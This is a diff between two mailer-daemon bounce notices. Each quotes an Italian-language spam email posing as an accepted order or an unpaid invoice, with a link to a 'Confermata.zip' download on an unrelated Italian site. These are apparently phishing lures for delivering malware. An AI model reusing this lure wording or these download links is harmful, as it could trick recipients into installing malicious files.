@@ -1,7 +1,7 @@
-From: Mail Delivery System <Mailer-Daemon-UB6erNS7bFybc5oKkk7c4frKmtPpkWbf@public.gmane.org>
+From: Mail Delivery System <Mailer-Daemon-Dvajvdd26xSfqzSq9kmGN8Wq2KfUq7yvgfoxzgwHRXE@public.gmane.org>
 Subject: Mail delivery failed: returning message to sender
-Date: Tue, 21 Feb 2012 01:20:59 -0500
-Message-ID: <E1Rzj5v-0006i5-Hy@weblin002.b2bhosting.net>
+Date: Tue, 21 Feb 2012 07:11:41 +0100
+Message-ID: <E1Rziwv-0007Zj-3J@hs-472.dedicated.hostalia.com>
 Mime-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
@@ -23,23 +23,35 @@ This message was created automatically by mail delivery software.
 A message that you sent could not be delivered to one or more of its
 recipients. This is a permanent error. The following address(es) failed:
 
-  panseri9074-gH+WsCr1+wQ1GQ1Ptb7lUw@public.gmane.org
-    Domain marvelousimpex.com has exceeded the max emails per hour (100) allowed. Message discarded.
+  jina-t48WSDuRoGU@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<jina-t48WSDuRoGU@public.gmane.org>:
+    host mail.nline.it [194.21.156.5]: 511 sorry, no mailbox here by that name (#5.1.1 - chkuser)
+  jimwenm-t48WSDuRoGU@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<jimwenm-t48WSDuRoGU@public.gmane.org>:
+    host mail.nline.it [194.21.156.5]: 511 sorry, no mailbox here by that name (#5.1.1 - chkuser)
+  jimwann-t48WSDuRoGU@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<jimwann-t48WSDuRoGU@public.gmane.org>:
+    host mail.nline.it [194.21.156.5]: 511 sorry, no mailbox here by that name (#5.1.1 - chkuser)
+  jimtsl-t48WSDuRoGU@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<jimtsl-t48WSDuRoGU@public.gmane.org>:
+    host mail.nline.it [194.21.156.5]: 511 sorry, no mailbox here by that name (#5.1.1 - chkuser)
+  jimtsdd-t48WSDuRoGU@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<jimtsdd-t48WSDuRoGU@public.gmane.org>:
+    host mail.nline.it [194.21.156.5]: 511 sorry, no mailbox here by that name (#5.1.1 - chkuser)
 
 ------ This is a copy of the message, including all the headers. ------
 
 Return-path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: from cpanel50.swiftco.net ([216.18.227.242])
-	by weblin002.b2bhosting.net with esmtpa (Exim 4.69)
+Received: from [208.89.210.204] (helo=vps.datacenterbolivia.com)
+	by hs-472.dedicated.hostalia.com with esmtpa (Exim 4.69)
 	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
-	id 1Rzj5v-0006hy-AB
-	for panseri9074-gH+WsCr1+wQ1GQ1Ptb7lUw@public.gmane.org; Tue, 21 Feb 2012 01:20:59 -0500
-Received: from [216.18.227.242] by cpanel50.swiftco.net id iBjQ6CkLOPLi; Mon, 20 Feb 2012 22:20:58 -0800
-Message-ID: <001701ccf060$f7b0fd80$0200a8c0-UqesdKZYNawCNHY3F7U79eTW4wlIGRCZ@public.gmane.org>
-From: "Billing" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <panseri9074-gH+WsCr1+wQ1GQ1Ptb7lUw@public.gmane.org>
-Subject: Il tuo ordine e stato accettato.
-Date: Mon, 20 Feb 2012 22:20:58 -0800
+	id 1Rziwk-0007Yz-Cu; Tue, 21 Feb 2012 07:11:30 +0100
+Received: from [208.89.210.204] by vps.datacenterbolivia.com id F4TTipLthk9E; Mon, 20 Feb 2012 23:11:40 -0700
+Message-ID: <001b01ccf05f$abb18900$14000a0a-J7+7M2dRO4ACJ8ddfNFNZ6CD0JFbOjFwAL8bYrjMMd8@public.gmane.org>
+From: "Consult Group" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <jimtsdd-t48WSDuRoGU@public.gmane.org>
+Subject: Ordinate 390299.
+Date: Mon, 20 Feb 2012 23:11:40 -0700
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
@@ -48,11 +60,9 @@ Content-Transfer-Encoding: 8bit
 
 
 Gentile utente, Monte Biz  
-    
+          
 
+Si prega di notare che hai una fattura non pagata.
 
-La tua richiesta di riesame e la possibile estensione della vostra azienda.
-
-Stato studiato.
-Sulla base della richiesta, si fa riferimento alle proposte e raccomandazioni.
-http://www.leportatedanoi.it/it/Confermata.zip
+Dettagli
+http://www.selsicilia.it/adviser/Confermata.zip?196227
